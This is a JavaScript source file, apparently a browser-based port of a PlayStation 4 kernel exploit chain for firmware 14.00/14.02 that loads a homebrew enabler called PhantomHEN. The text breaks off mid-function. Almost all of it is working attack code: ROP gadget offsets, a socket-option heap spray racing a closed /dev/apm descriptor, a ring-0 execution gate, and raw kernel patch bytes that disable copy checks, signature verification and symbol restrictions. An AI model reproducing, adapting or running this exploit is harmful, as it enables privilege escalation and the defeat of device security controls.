/*
    afterglow -- PlayStation 4 kernel exploit for firmware 14.00
    Port to the raw13 host (WebKit entry), from the Lua original.
    PhantomHEN build -- iDntUseModz

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as
    published by the Free Software Foundation, either version 3 of the
    License, or (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// PhantomHEN exploit chain -- iDntUseModz
const REBUILT_PAYLOAD = "phantomhen.bin";
const AFTERGLOW_ATTEMPTS = 15;

import { int64 } from "./int64.js";

const S = {
  read: 3, open: 5, close: 6, ioctl: 54, mprotect: 74, socket: 97, setsockopt: 105,
  getuid: 24, kqueue: 362, kevent: 363, mmap: 477, lseek: 478, thr_self: 432,
  getpid: 20, sysctl: 202, cpuset_getaffinity: 487,
  cpuset_setaffinity: 488, dynlib_get_list: 592, dynlib_get_info: 593,
  dynlib_load_prx: 594, dynlib_unload_prx: 595,
  write: 4, mkdir_: 136,
};

const K = {
  anchor:    0x00e6c30,
  swap_rbp:  0x0a80f68,
  prison0:   0x111fa18,
  rootvnode: 0x2136e90,
};

const GADGETS = {
  pivot:  [0x0d2812, "488b67385fc3"],
  rdi:    [0x0a6bae, "5fc3"],
  rsi:    [0x095560, "5ec3"],
  rdx:    [0x04e6d2, "5ac3"],
  rcx:    [0x0943ee, "59c3"],
  store:  [0x041ceb, "488907c3"],
  load:   [0x0120b1, "488b07c3"],
  load8:  [0x057fae, "488b4008c3"],
  add:    [0x0aaf8b, "4801f8c3"],
  sub:    [0x0275b4, "4829f8c3"],
  shr:    [0x0a9ba2, "48d3e8c3"],
  shl:    [0x0a9b98, "48d3e0c3"],
  memcpy: [0x026ad0, "554889e54889f8"],
  leave:  [0x09e59d, "c9c3"],
};

const HOST = { page: 0x130000, free: 0x130730, last: 0x131000 };

const TUNE = {
  sprays: 126,
  object: 104,
  window: 0x4000,
  entries: 420,
  stride: 0x90,
  seed: 45,
  spare: 8,
  units: 15,
  batch: 60,
  ceiling: 63,
};

const PROBE_NODES = ["/dev/rng", "/dev/urandom", "/dev/random", "/dev/zero", "/dev/null"];

const PATCHSET_1402 = new Uint8Array([
  0xb9,0x82,0x00,0x00,0xc0,0x0f,0x32,0x48,0xc1,0xe2,0x20,0x89,0xc0,0x48,0x09,0xc2,
  0x48,0x8d,0x8a,0x40,0xfe,0xff,0xff,0x0f,0x20,0xc0,0x48,0x25,0xff,0xff,0xfe,0xff,
  0x0f,0x22,0xc0,0xb8,0xeb,0x04,0x00,0x00,0xbe,0xeb,0x04,0x00,0x00,0xbf,0x90,0xe9,
  0xff,0xff,0x41,0xb8,0xeb,0x00,0x00,0x00,0x66,0x89,0x81,0x43,0x7a,0x1b,0x00,0xb8,
  0xeb,0x04,0x00,0x00,0x41,0xb9,0xeb,0x00,0x00,0x00,0x41,0xba,0xeb,0x00,0x00,0x00,
  0x66,0x89,0x81,0x5c,0xcb,0x2f,0x00,0x41,0xbb,0xeb,0x00,0x00,0x00,0xb8,0x90,0xe9,
  0xff,0xff,0x66,0xc7,0x81,0xb4,0x0a,0x00,0x00,0xff,0x26,0x48,0x81,0xc2,0xf4,0x08,
  0x00,0x00,0x66,0x89,0xb1,0x53,0x7a,0x1b,0x00,0x66,0x89,0xb9,0x73,0x7a,0x1b,0x00,
  0x66,0x44,0x89,0x81,0x84,0x86,0x62,0x00,0xc6,0x81,0xcd,0x0a,0x00,0x00,0xeb,0xc6,
  0x81,0x9d,0xd7,0x2b,0x00,0xeb,0xc6,0x81,0xe1,0xd7,0x2b,0x00,0xeb,0xc6,0x81,0x5d,
  0xd8,0x2b,0x00,0xeb,0xc6,0x81,0xa1,0xd8,0x2b,0x00,0xeb,0xc6,0x81,0x4d,0xda,0x2b,
  0x00,0xeb,0xc6,0x81,0xfd,0xde,0x2b,0x00,0xeb,0xc6,0x81,0xcd,0xdf,0x2b,0x00,0xeb,
  0x66,0x44,0x89,0x89,0x6f,0x92,0x62,0x00,0xc7,0x81,0x90,0x04,0x00,0x00,0x00,0x00,
  0x00,0x00,0xc6,0x81,0xc2,0x04,0x00,0x00,0xeb,0x66,0x44,0x89,0x91,0xb9,0x04,0x00,
  0x00,0x66,0x44,0x89,0x99,0xb5,0x04,0x00,0x00,0xc6,0x81,0xc6,0x1f,0x39,0x00,0xeb,
  0x66,0x89,0x81,0x04,0x75,0x1b,0x00,0xc7,0x81,0xb8,0x7a,0x1b,0x00,0x90,0xe9,0x3c,
  0x01,0xc7,0x81,0xc0,0xe3,0x3b,0x00,0x48,0x31,0xc0,0xc3,0xc6,0x81,0xda,0xaa,0x1f,
  0x00,0x37,0xc6,0x81,0xdd,0xaa,0x1f,0x00,0x37,0xc7,0x81,0x80,0x2d,0x10,0x01,0x02,
  0x00,0x00,0x00,0x48,0x89,0x91,0x88,0x2d,0x10,0x01,0xc7,0x81,0xac,0x2d,0x10,0x01,
  0x01,0x00,0x00,0x00,0x0f,0x20,0xc0,0x48,0x0d,0x00,0x00,0x01,0x00,0x0f,0x22,0xc0,
  0x0f,0x20,0xc0,0x48,0x25,0xff,0xff,0xfe,0xff,0x0f,0x22,0xc0,0xb8,0xeb,0x48,0x00,
  0x00,0xba,0x04,0x00,0x00,0x00,0x45,0x31,0xc0,0x45,0x31,0xc9,0xbe,0x05,0x00,0x00,
  0x00,0x66,0x89,0x81,0x91,0x57,0x12,0x00,0xb8,0xeb,0x06,0x00,0x00,0xbf,0x05,0x00,
  0x00,0x00,0x66,0x89,0x81,0xd3,0x57,0x12,0x00,0x41,0xba,0x01,0x00,0x00,0x00,0x48,
  0xb8,0x41,0x83,0xbf,0xa0,0x04,0x00,0x00,0x00,0x41,0xbb,0x01,0x00,0x00,0x00,0x48,
  0x89,0x81,0xdb,0x57,0x12,0x00,0xb8,0x04,0x00,0x00,0x00,0x66,0x89,0x81,0xed,0x57,
  0x12,0x00,0xb8,0x49,0x8b,0xff,0xff,0xc7,0x81,0xe9,0x57,0x12,0x00,0x49,0x8b,0x87,
  0xd0,0xc6,0x81,0xef,0x57,0x12,0x00,0x00,0xc7,0x81,0xf6,0x57,0x12,0x00,0x49,0x8b,
  0xb7,0xb0,0x66,0x89,0x91,0xfa,0x57,0x12,0x00,0xc6,0x81,0xfc,0x57,0x12,0x00,0x00,
  0xc7,0x81,0x0e,0x58,0x12,0x00,0x49,0x8b,0x87,0x40,0x66,0x89,0xb1,0x12,0x58,0x12,
  0x00,0xc6,0x81,0x14,0x58,0x12,0x00,0x00,0xc7,0x81,0x1b,0x58,0x12,0x00,0x49,0x8b,
  0xb7,0x20,0x66,0x89,0xb9,0x1f,0x58,0x12,0x00,0xc6,0x81,0x21,0x58,0x12,0x00,0x00,
  0xc7,0x81,0x33,0x58,0x12,0x00,0x49,0x8d,0xbf,0xc0,0x66,0x44,0x89,0x81,0x37,0x58,
  0x12,0x00,0xc6,0x81,0x39,0x58,0x12,0x00,0x00,0xc7,0x81,0x3f,0x58,0x12,0x00,0x49,
  0x8d,0xbf,0xe0,0x66,0x44,0x89,0x89,0x43,0x58,0x12,0x00,0xc6,0x81,0x45,0x58,0x12,
  0x00,0x00,0xc7,0x81,0x52,0x58,0x12,0x00,0x49,0x8d,0xbf,0x00,0x66,0x44,0x89,0x91,
  0x56,0x58,0x12,0x00,0xc6,0x81,0x58,0x58,0x12,0x00,0x00,0xc7,0x81,0x5e,0x58,0x12,
  0x00,0x49,0x8d,0xbf,0x20,0x66,0x44,0x89,0x99,0x62,0x58,0x12,0x00,0xc6,0x81,0x64,
  0x58,0x12,0x00,0x00,0x66,0x89,0x81,0x6f,0x58,0x12,0x00,0xc6,0x81,0x71,0x58,0x12,
  0x00,0xff,0x0f,0x20,0xc0,0x48,0x0d,0x00,0x00,0x01,0x00,0x0f,0x22,0xc0,0x31,0xc0,
  0xc3
]);

const BOOTSTRAP =
    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
  + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
  + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
  + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
  + "20c0480d000001000f22c031c0c3";

/* This table was validated against this console's own kernel image
   (kernel_1402.bin): 15/15 expected bytes match. The vendor table this
   previously carried belongs to a different 14.02 build -- none of its
   offsets resolved on this kernel, so no PhantomHEN kernel patch had ever
   actually landed. The 4th column is the expected pristine byte string. */
const PATCHES = [
  [0x0000acd, "eb",       "bcopy",                         "76"],
  [0x02bda9d, "eb",       "bzero",                         "76"],
  [0x02bdae1, "eb",       "pagezero",                      "76"],
  [0x02bdb5d, "eb",       "memcpy",                        "76"],
  [0x02bdba1, "eb",       "pagecopy",                      "76"],
  [0x02bdd4d, "eb",       "copyin",                        "76"],
  [0x02be1fd, "eb",       "copyinstr",                     "76"],
  [0x02be2cd, "eb",       "copystr",                       "76"],
  [0x01b7c63, "eb04",     "dlsym, first check",            "0f85"],
  [0x01b7c73, "eb04",     "dlsym, second check",           "0f84"],
  [0x01b7c93, "90e9",     "dlsym, nop and jump",           "0f84"],
  [0x01b7724, "90e9",     "load_prx",                      "0f84"],
  [0x01b7cd8, "90e93c01", "dlsym, open it to every caller", "0f823901"],
  [0x0628b04, "eb00",     "self verification",             "7407"],
  [0x06293ef, "eb00",     "delayed panic on suspend",      "7541"],
];

const STATE = { ctx: null, units: {}, clones: 0, base: null, stubs: {}, batch: undefined, retry: false };

function host() {
  if (!STATE.ctx) throw new Error("afterglow: no host installed");
  return STATE.ctx;
}

function say(fmt) {
  host().mark("AG", fmt);
  try {
    /* every line goes to the host: the whitelist that used to sit here hid
       the preflight refusals, which is exactly what a failed run needs to say */
    fetch("ag_log?m=" + encodeURIComponent(fmt), { keepalive: true }).catch(function () {});
  } catch (e) {}
}

const LOW = 0x100000000;

function v(low, hi) { return new int64(low >>> 0, (hi || 0) >>> 0); }
function plus(a, n) { return n < 0 ? a.sub32(-n) : a.add32(n); }
function same(a, b) { return !!b && a.low === b.low && a.hi === b.hi; }
function inText(a) { return a.hi >= 0xffffff00 && a.low !== 0; }
function inHeap(a) { return a.hi >= 0xffff0000 && a.hi < 0xffffff00 && a.low !== 0; }
function text(a) { return "0x" + a.toString(16).padStart(16, "0"); }

function seedStubs() {
  const c = host();
  const need = new Set();
  for (const k in S) {
    const n = S[k];
    if (!(c.stubAddr && c.stubAddr.has(n)) && !STATE.stubs[n]) need.add(n);
  }
  if (!need.size) return [];

  const base = c.libkernelBase;
  if (!base) return Array.from(need);

  const limit = (c.off && c.off.k_scan_stage1) || 0x200000;
  for (let o = 0; o < limit && need.size; o += 16) {
    const q = c.p.read8(base.add32(o));
    if ((q.low & 0x00ffffff) !== 0xc0c748 || (q.hi >>> 24) !== 0x49) continue;
    const n = ((q.low >>> 24) | ((q.hi & 0x00ffffff) << 8)) >>> 0;
    if (!need.has(n)) continue;
    STATE.stubs[n] = base.add32(o);
    need.delete(n);
  }
  return Array.from(need);
}

function stubFor(num) {
  const c = host();
  if (STATE.stubs[num]) return STATE.stubs[num];
  if (c.stubAddr && c.stubAddr.has(num)) return c.stubAddr.get(num);
  return null;
}

function sc(num) {
  const a = Array.prototype.slice.call(arguments, 1);
  const t = stubFor(num);
  if (!t) throw new Error("afterglow: no libkernel stub for syscall " + num);
  return host().callAddr(t, a);
}

function alloc(size) {
  const c = host();
  const ab = new ArrayBuffer(size);
  const u8 = new Uint8Array(ab);
  const dv = new DataView(ab);
  c.keepAlive.push(ab, u8, dv);
  return { ab: ab, u8: u8, dv: dv, at: c.bufAddr(ab) };
}

function rd4(at) { return host().p.read4(at) >>> 0; }
function rd8(at) { const r = host().p.read8(at); return v(r.low, r.hi); }
function wr1(at, b) { host().p.write1(at, b & 0xff); }
function wr4(at, n) { host().p.write4(at, n >>> 0); }
function wr8(at, q) { host().p.write8(at, q); }

function rdbuf(at, len) {
  const out = new Uint8Array(len);
  const pr = host().p;
  let i = 0;
  while (i + 8 <= len) {
    const q = pr.read8(plus(at, i));
    let lo = q.low >>> 0, hi = q.hi >>> 0;
    for (let k = 0; k < 4; k++) { out[i + k] = lo & 0xff; lo = lo >>> 8; }
    for (let k = 0; k < 4; k++) { out[i + 4 + k] = hi & 0xff; hi = hi >>> 8; }
    i += 8;
  }
  while (i < len) { out[i] = pr.read1(plus(at, i)) & 0xff; i++; }
  return out;
}

function wrbuf(at, bytes) {
  for (let i = 0; i < bytes.length; i++) wr1(plus(at, i), bytes[i]);
}

function unhex(s) {
  const out = new Uint8Array(s.length / 2);
  for (let i = 0; i < out.length; i++) out[i] = parseInt(s.substr(i * 2, 2), 16);
  return out;
}

function sameBytes(a, b) {
  if (a.length !== b.length) return false;
  for (let i = 0; i < a.length; i++) if (a[i] !== b[i]) return false;
  return true;
}

function pokeAt(buf, off, q) {
  buf.dv.setUint32(off, q.low >>> 0, true);
  buf.dv.setUint32(off + 4, q.hi >>> 0, true);
}

function wipe(buf, len) { buf.u8.fill(0, 0, len); }

function cstr(s) {
  const b = alloc(s.length + 8);
  for (let i = 0; i < s.length; i++) b.u8[i] = s.charCodeAt(i);
  b.u8[s.length] = 0;
  return b;
}

function splitNum(n) { return v(n % LOW, Math.floor(n / LOW)); }
function asQ(x) { return (typeof x === "number") ? splitNum(x) : x; }

function codeAt(pageAt, off) {
  return {
    at: plus(pageAt, off),
    n: 0,
    reset: function () { this.n = 0; return this; },
    byte: function (b) { wr1(plus(this.at, this.n), b); this.n++; return this; },
    hex: function (s) {
      const b = unhex(s);
      for (let i = 0; i < b.length; i++) this.byte(b[i]);
      return this;
    },
    dw: function (n) {
      for (let k = 0; k < 4; k++) this.byte(Math.floor(n / Math.pow(256, k)) % 256);
      return this;
    },
    qw: function (q) { return this.dw(q.low >>> 0).dw(q.hi >>> 0); },
    imm: function (bytes) {
      for (let i = 0; i < bytes.length; i++) this.byte(bytes[i]);
      return this;
    },
  };
}

function makeChain(buf, gad) {
  return {
    buf: buf, base: buf.at, n: 0, fix: [], g: gad,

    slot: function (q) { pokeAt(this.buf, this.n * 8, asQ(q)); this.n++; return this.n - 1; },
    num: function (n) { return this.slot(asQ(n)); },
    hole: function () { return this.slot(v(0, 0)); },
    where: function (i) { return plus(this.base, i * 8); },
    gad: function (name) { return this.slot(this.g[name]); },
    point: function (hole, target) { this.fix.push([hole, target]); },

    seal: function () {
      for (let i = 0; i < this.fix.length; i++) {
        pokeAt(this.buf, this.fix[i][0] * 8, this.where(this.fix[i][1]));
      }
      this.gad("leave");
    },

    rdi: function (n) { this.gad("rdi"); return this.num(n); },
    rsi: function (n) { this.gad("rsi"); return this.num(n); },
    rdx: function (n) { this.gad("rdx"); return this.num(n); },

    follow: function (off) {
      const d = off - 8;
      if (d >= 0) { this.rdi(d); this.gad("add"); } else { this.rdi(-d); this.gad("sub"); }
      this.gad("load8");
    },

    save_rax: function (at) { this.rdi(at); this.gad("store"); },
    load_rax: function (at) { this.rdi(at); this.gad("load"); },

    grab: function (dst, len) {
      this.gad("rdi"); const h = this.hole();
      this.gad("store");
      this.gad("rsi"); const s = this.hole();
      this.point(h, s);
      this.rdx(len); this.rdi(dst); this.gad("memcpy");
      return s;
    },

    put: function (dst, src, len) {
      this.gad("rdi"); this.slot(dst);
      this.rsi(src); this.rdx(len); this.gad("memcpy");
    },
  };
}

function shooter(gad) {
  const s = {
    g: gad, fired: 0, sprayed: 0, devs: [], queues: [],
    sockaddr: alloc(16),
  };
  const bs = [16, 2, 0x04, 0xD2, 0x0a, 0, 0, 1];
  for (let i = 0; i < bs.length; i++) s.sockaddr.u8[i] = bs[i];

  s.hold = function (path) {
    const fd = sc(S.open, cstr(path).at, 0).i32;
    if (fd >= 0) this.devs.push(fd);
    return fd;
  };

  s.take = function (build, room) {

    this.why = null;
    if (this.hold("/dev/apm") < 0) {
      this.why = "the clone node refused to open, errno " + host().errno();
      return null;
    }

    let unit = -1, watched = -1;
    const refused = [];
    for (let u = TUNE.ceiling; u >= 0; u--) {
      if (STATE.units[u]) continue;
      const fd = this.hold("/dev/apm" + u);
      if (fd >= 0) { unit = u; watched = fd; break; }
      if (refused.length < 4) refused.push(u + ":e" + host().errno());
    }
    if (unit < 0) {
      this.why = "no apm unit among 0.." + TUNE.ceiling
                 + " (" + Object.keys(STATE.units).length + " spent, refusals "
                 + refused.join(" ") + ")";
      return null;
    }
    STATE.units[unit] = true;
    this.fired++;

    const doomed = sc(S.open, cstr("/dev/apm" + unit).at, 0).i32;
    if (doomed < 0) {
      this.why = "second open of /dev/apm" + unit + " refused, errno " + host().errno();
      return null;
    }

    const q = sc(S.kqueue).i32;
    this.queues.push(q);
    const ev = alloc(32);
    const arm = function () {
      ev.dv.setUint32(0, watched >>> 0, true);
      ev.dv.setUint32(4, 0, true);
      ev.dv.setUint16(8, 0xFFFF, true);
      ev.dv.setUint16(10, 0x0001, true);
      ev.dv.setUint32(12, 0, true);
      ev.u8.fill(0, 16, 32);
      return sc(S.kevent, q, ev.at, 1, 0, 0, 0).i32;
    };
    const armed = arm();
    if (armed !== 0) {
      this.why = "kevent would not arm on unit " + unit + ", rv=" + armed
                 + " errno " + host().errno();
      return null;
    }

    const rop = alloc(room || 0x400);
    const frame = alloc(0x100);
    wipe(frame, 0x100);
    const c = makeChain(rop, this.g);
    c.num(0);
    build(c);
    c.seal();
    pokeAt(frame, 0x38, rop.at);

    const body = alloc(TUNE.object);
    wipe(body, TUNE.object);
    pokeAt(body, 0x38, this.g.pivot);
    pokeAt(body, 0x58, frame.at);

    const req = alloc(40);
    req.dv.setUint32(0, 1, true);
    req.dv.setUint32(4, 0, true);
    pokeAt(req, 8, this.sockaddr.at);
    req.dv.setUint32(16, 16, true);
    pokeAt(req, 24, body.at);
    req.dv.setUint32(32, TUNE.object, true);

    const want = TUNE.seed;
    for (let i = 0; i < want; i++) {
      if (this.hold("/dev/apm") < 0) break;
      STATE.clones++;
    }

    const socks = [];
    for (let i = 0; i < TUNE.sprays; i++) {
      const fd = sc(S.socket, 2, 2, 0).i32;
      if (fd < 0) break;
      socks.push(fd);
    }

    const hh = host();
    const stub = stubFor(S.setsockopt);

    if (STATE.batch === undefined && hh.prepareMany && stub) {
      STATE.batch = 0;
      for (let n = TUNE.sprays; n >= 8; n = Math.floor(n * 3 / 4)) {
        try {
          const probeCalls = [];
          for (let i = 0; i < n; i++) probeCalls.push([stub, [0, 17, 128, req.at, 40]]);
          hh.prepareMany(probeCalls);
          STATE.batch = n; break;
        } catch (e) {  }
      }
      say("    rop stack takes " + STATE.batch + " calls per entry");
    }
    const batch = (hh.prepareMany && hh.runPrepared && stub) ? (STATE.batch || 0) : 0;
    const fertig = [];
    if (batch) {
      const calls = [];
      for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
      for (let i = 0; i < calls.length; i += batch) {
        fertig.push(hh.prepareMany(calls.slice(i, i + batch)));
      }

      hh.runPrepared(hh.prepareMany([[stubFor(S.getuid), []]]));
    }

    const t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
    sc(S.close, doomed);
    if (batch) {
      for (let i = 0; i < fertig.length; i++) hh.runPrepared(fertig[i]);
    } else {
      for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
    }
    const t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
    this.window = t1 - t0;
    this.batched = batch;

    for (let i = 0; i < TUNE.spare; i++) this.hold("/dev/apm");

    this.sprayed = socks.length;
    const r = arm();

    for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
    say("    window " + this.window.toFixed(2) + " ms for " + socks.length
        + " setsockopt in " + (this.batched ? fertig.length : socks.length) + " entries");
    return r;
  };

  return s;
}

function ran(r) { return r !== null && r === -1; }

function qAt(buf, off) {
  return v(buf.dv.getUint32(off, true), buf.dv.getUint32(off + 4, true));
}

const GATE = 0x0a0, BODY = 0x0c0, OUT = 0x400, FLAG = 0x420, STAGE = 0x440;
const STAGE_MAX = 0x400;
const SIGIL = 0x600D600D;

function openRing0(roomAt) {
  const r = { at: roomAt, body: codeAt(roomAt, BODY) };
  codeAt(roomAt, GATE).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");

  r.begin = function () { return this.body.reset(); };

  r.run = function () {
    this.body.hex("48b8").qw(plus(this.at, FLAG)).hex("c700").dw(SIGIL).hex("31c0").hex("c3");
    wr4(plus(this.at, FLAG), 0);
    host().callAddr(plus(this.at, GATE), [11, plus(this.at, BODY)]);
    return (rd4(plus(this.at, FLAG)) >>> 0) === (SIGIL >>> 0);
  };

  r.out = function () { return rd8(plus(this.at, OUT)); };

  r.thread = function () {
    this.begin().hex("48ba").qw(plus(this.at, OUT)).hex("48893a");
    return this.run() ? this.out() : null;
  };

  r.base = function () {
    const c = this.begin();
    c.hex("b9").dw(0xc0000082).hex("0f32");
    c.hex("48c1e220").hex("89c0").hex("4809c2");
    c.hex("48b8").qw(plus(this.at, OUT)).hex("488910");
    return this.run() ? plus(this.out(), -0x1c0) : null;
  };

  r.copy = function (dst, src, len, guarded) {
    const c = this.begin();
    if (guarded) c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
    c.hex("48bf").qw(dst);
    c.hex("48be").qw(src);
    c.hex("48b9").qw(splitNum(len));
    c.hex("fc").hex("f3a4");
    if (guarded) c.hex("0f20c0").hex("480d").dw(0x00010000).hex("0f22c0");
    return this.run();
  };

  r.apply = function (base, list) {
    const c = this.begin();
    c.hex("48b9").qw(base);
    c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
    for (let i = 0; i < list.length; i++) {
      const bytes = unhex(list[i][1]);
      if (bytes.length === 1) c.hex("c681");
      else if (bytes.length === 2) c.hex("66c781");
      else c.hex("c781");
      c.dw(list[i][0]).imm(bytes);
    }
    c.hex("0f20c0").hex("480d").dw(0x00010000).hex("0f22c0");
    return this.run();
  };

  r.read = function (at, len) {
    len = len || 8;
    if (!this.copy(plus(this.at, STAGE), at, len, false)) return null;
    return rdbuf(plus(this.at, STAGE), len);
  };

  r.read_v = function (at) {
    const s = this.read(at, 8);
    if (!s) return null;
    let lo = 0, hi = 0;
    for (let i = 3; i >= 0; i--) lo = lo * 256 + s[i];
    for (let i = 7; i >= 4; i--) hi = hi * 256 + s[i];
    return v(lo, hi);
  };

  r.write = function (at, bytes) {
    wrbuf(plus(this.at, STAGE), bytes);
    return this.copy(at, plus(this.at, STAGE), bytes.length, true);
  };

  r.write_v = function (at, q) {
    const b = new Uint8Array(8);
    let lo = q.low >>> 0, hi = q.hi >>> 0;
    for (let i = 0; i < 4; i++) { b[i] = lo % 256; lo = Math.floor(lo / 256); }
    for (let i = 4; i < 8; i++) { b[i] = hi % 256; hi = Math.floor(hi / 256); }
    return this.write(at, b);
  };

  return r;
}

function isZero(q) { return !q || ((q.low >>> 0) === 0 && (q.hi >>> 0) === 0); }

let MAPS = null;

function findLibByShape() {
  const r = { base: null, entries: 0, big: 0, first: [], note: null };
  MAPS = [];
  const pid = sc(S.getpid).i32;
  const mib = alloc(16);
  mib.dv.setInt32(0, 1, true); mib.dv.setInt32(4, 14, true);
  mib.dv.setInt32(8, 32, true); mib.dv.setInt32(12, pid, true);
  const len = alloc(8);
  len.dv.setUint32(0, 0, true); len.dv.setUint32(4, 0, true);
  let rv = sc(S.sysctl, mib.at, 4, 0, len.at, 0, 0).i32;
  let need = len.dv.getUint32(0, true);
  if (rv !== 0 || !need) { r.note = "vmmap sizing rv=" + rv; return r; }
  const buf = alloc(need + 0x8000);
  len.dv.setUint32(0, need + 0x8000, true); len.dv.setUint32(4, 0, true);
  rv = sc(S.sysctl, mib.at, 4, buf.at, len.at, 0, 0).i32;
  const used = Math.min(len.dv.getUint32(0, true), buf.u8.length);
  if (rv !== 0 || !used) { r.note = "vmmap read rv=" + rv; return r; }

  const span = HOST.last;
  const cand = [];
  let off = 0;
  while (off + 8 <= used) {
    const size = buf.dv.getInt32(off, true);
    if (size <= 0 || off + size > used) break;
    r.entries++;
    const start = qAt(buf, off + 8), stop = qAt(buf, off + 16);
    MAPS.push([start, stop]);
    if (r.first.length < 4) r.first.push(text(start) + "-" + text(stop));
    const bytes = (stop.hi - start.hi) * LOW + (stop.low - start.low);
    if (start.hi > 0 && (start.low & 0x3fff) === 0 && bytes >= span) {
      cand.push(start); r.big++;
    }
    off += size;
  }

  const probes = [GADGETS.pivot, GADGETS.memcpy];
  for (let i = 0; i < cand.length; i++) {
    let all = true;
    for (let k = 0; k < probes.length && all; k++) {
      const want = unhex(probes[k][1]);
      if (!sameBytes(rdbuf(plus(cand[i], probes[k][0]), want.length), want)) all = false;
    }
    if (all) { r.base = cand[i]; return r; }
  }
  r.note = "no mapping carries the gadget shape (" + r.big + " of " + r.entries + " long enough)";
  return r;
}

function findLib(name) {
  const r = { base: null, rv: null, count: 0, seen: [], note: null };
  const list = alloc(4 * 0x300), count = alloc(8);
  count.dv.setUint32(0, 0, true); count.dv.setUint32(4, 0, true);
  r.rv = sc(S.dynlib_get_list, list.at, 0x300, count.at).i32;
  r.count = count.dv.getUint32(0, true);
  if (r.rv !== 0) { r.note = "dynlib_get_list rv=" + r.rv; return r; }
  if (!r.count) { r.note = "the module list came back empty"; return r; }

  const info = alloc(0x160);
  for (let i = 0; i < r.count; i++) {
    info.u8.fill(0);
    info.dv.setUint32(0, 0x160, true);
    const rv = sc(S.dynlib_get_info, list.dv.getUint32(i * 4, true), info.at).i32;
    if (rv !== 0) continue;
    let nm = "";
    for (let k = 8; k < 0x100 && info.u8[k] !== 0; k++) nm += String.fromCharCode(info.u8[k]);
    if (r.seen.length < 6) r.seen.push(nm);
    if (nm === name) {
      let b = qAt(info, 0x108);
      if (!isZero(b)) { r.base = b; r.at = "0x108"; return r; }

      const cand = [];
      for (let o = 8; o + 8 <= 0x160; o += 8) {
        const q = qAt(info, o);
        if (isZero(q)) continue;
        if (q.hi > 0x40) continue;
        if ((q.low & 0x3fff) !== 0) continue;
        cand.push("+0x" + o.toString(16) + "=" + text(q));
        if (r.base === null) { r.base = q; r.at = "+0x" + o.toString(16); }
      }
      r.note = cand.length
        ? ("base not at +0x108; grid aligned candidates: " + cand.join(" "))
        : "found " + name + " but no plausible base anywhere in the info struct";
      return r;
    }
  }
  r.note = name + " is not among the " + r.count + " modules";
  return r;
}

function pinCore() {
  const mask = alloc(16);
  mask.u8.fill(0);
  let rv = sc(S.cpuset_getaffinity, 3, 1, -1, 16, mask.at).i32;
  if (rv !== 0) return { ok: false, note: "getaffinity rv=" + rv };

  let core = -1, allowed = [];
  for (let b = 0; b < 128; b++) {
    if ((mask.u8[b >> 3] >> (b & 7)) & 1) { if (core < 0) core = b; allowed.push(b); }
  }
  if (core < 0) return { ok: false, note: "no core in the mask" };

  mask.u8.fill(0);
  mask.u8[core >> 3] = 1 << (core & 7);
  rv = sc(S.cpuset_setaffinity, 3, 1, -1, 16, mask.at).i32;
  return { ok: rv === 0, core: core, allowed: allowed.join(","), note: "setaffinity rv=" + rv };
}

async function fetchBytes(url, tag) {
  say("[" + tag + "] fetching " + url + " ...");
  let timer = null;
  const controller = typeof AbortController === "function" ? new AbortController() : null;
  try {
    const request = (async function () {
      const options = { cache: "no-store", headers: { "ngrok-skip-browser-warning": "1" } };
      if (controller) options.signal = controller.signal;
      const r = await fetch(url + (url.indexOf("?") < 0 ? "?" : "&") + "_=" + Date.now(), options);
      if (!r.ok) { say("[" + tag + "] " + url + " HTTP " + r.status); return null; }
      const bytes = new Uint8Array(await r.arrayBuffer());
      say("[" + tag + "] " + url + " OK (" + bytes.length + " bytes)");
      return bytes;
    })();
    const timeout = new Promise(function (resolve) {
      timer = setTimeout(function () {
        if (controller) controller.abort();
        say("[" + tag + "] " + url + " timed out after 120s -- refresh and retry");
        resolve(null);
      }, 120000);
    });
    return await Promise.race([request, timeout]);
  } catch (e) {
    say("[" + tag + "] " + url + " unreachable: " + (e && e.message));
    return null;
  } finally {
    if (timer !== null) clearTimeout(timer);
  }
}

function runPatchSet(room) {
  if (!room) { say("[p] Kernel gate address missing"); return false; }
  const pset = PATCHSET_1402;
  if (pset[pset.length - 1] !== 0xc3 || pset.length + 24 > OUT - BODY) {
    say("[p] 14.02 patchset does not fit in the gate body");
    return false;
  }
  const code = codeAt(room, BODY).imm(pset.subarray(0, pset.length - 1));
  code.hex("48b8").qw(plus(room, FLAG)).hex("c700").dw(SIGIL).hex("31c0").hex("c3");
  wr4(plus(room, FLAG), 0);
  host().callAddr(plus(room, GATE), [11, plus(room, BODY)]);
  if (rd4(plus(room, FLAG)) !== (SIGIL >>> 0)) {
    say("[p] 14.02 kernel patchset call failed");
    return false;
  }
  say("[p] 14.02 kernel patchset applied");
  return true;
}

function isPhantomHEN(blob) {
  return blob != null && blob.length > 0;
}

// Layout delta: 0 for the legacy binary (0x48f18), 0x2000 for the current build (0x4af18).
let shnOffset = 0;

function configurePhantomHEN(blob) {
  const image = new Uint8Array(blob);
  const d = new DataView(image.buffer);
  const params = host().params;
  // Legacy phantomhen.bin: exact size 0x48f18 + "SHN1" magic at 0x47a00.
  // Current phantomhen.bin: exact size 0x4af18 + "SHN1" magic at 0x49a00 (+0x2000).
  // For custom HEN (hen.bin and others) skip the phantomhen-specific patch pass.
  const isLegacy = blob.length === 0x48f18 && d.getUint32(0x47a00, true) === 0x314e4853;
  const isCurrent = blob.length === 0x4af18 && d.getUint32(0x49a00, true) === 0x314e4853;
  if (!isLegacy && !isCurrent) {
